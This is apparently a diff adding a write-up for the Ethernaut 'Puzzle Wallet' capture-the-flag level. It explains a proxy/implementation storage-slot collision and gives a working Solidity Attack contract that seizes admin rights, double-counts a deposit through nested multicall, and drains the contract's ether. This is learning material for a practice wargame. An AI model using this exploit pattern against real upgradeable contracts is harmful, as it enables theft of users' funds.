@@ -43,4 +43,52 @@ contract Attacker{
 
 ## Ethernaut 24
 
+```
+interface IWallet{
+    function admin() external view returns(address);
+    function proposeNewAdmin(address _newAdmin) external;
+    function approveNewAdmin(address _expectedAdmin) external;
+    function setMaxBalance(uint256 _maxBalance) external;
+    function addToWhitelist(address addr) external;
+    function deposit() external payable;
+    function execute(address to, uint256 value, bytes calldata data) external payable;
+    function multicall(bytes[] calldata data) external payable;
+}
+```
+
+    //vulnerability: layout of state variables are different in the proxy and the implementation
+    //1 --> proposeNewAdmin in the proxy to become a
+    // PuzzleProxy --> "pendingAdmin" == slot#0 
+    // PuzzleWallet --> "owner" == slot#0
+    //2 --> after being the pendingAdmin, in the implementation we are the "owner".
+    //3 --> call addToWhitelist() and put my address in the whitelist mapping
+    //4 --> Create 2 arrays to call multicall() --> [deposit(), multicall([deposit()])]
+    //5 --> call multicall() sending the array _dataToCall with msg.value 0.001
+    //5 --> because we call deposit() twice, our balance[msg.sender] == 0.002
+    //6 --> send to msg.sender the balance of the proxy (0.002 ether)
+    //7 --> setMaxBalance() will modify (maxBalance) on the implementation (slot#1)
+    //7 --> and (admin), slot#1 in proxy
+    //7 --> so we need to pass our address as a uint256 to update the slot#1
+
+```
+contract Attack{
+    //_target = "0xf4921938D75189dc103A9297ce3A00C549B625F5"    
+ 
+    constructor(IWallet _target) payable {
+        _target.proposeNewAdmin(address(this)); //1
+        _target.addToWhitelist(address(this)); //2 & 3
+        bytes[] memory _depositSignature = new bytes[](1);//4
+        _depositSignature[0] = abi.encodeWithSignature("deposit()");//4
+        bytes[] memory _dataToCall = new bytes[](2); //4
+        _dataToCall[0] = _depositSignature[0]; //4
+        _dataToCall[1] = abi.encodeWithSelector(_target.multicall.selector, _depositSignature); //4
+        _target.multicall{value: 0.001 ether}(_dataToCall); //5
+        _target.execute(msg.sender, 0.002 ether, ""); //6
+        uint256 _myAddress = uint256(uint160(bytes20(msg.sender))); //7 parseWallet to uint
+        _target.setMaxBalance(_myAddress); //7
+        require(_target.admin() == msg.sender,"Failed hacking"); 
+    }
+}
+```
+
 ## Ethernaut 25 (proxy of the proxy)
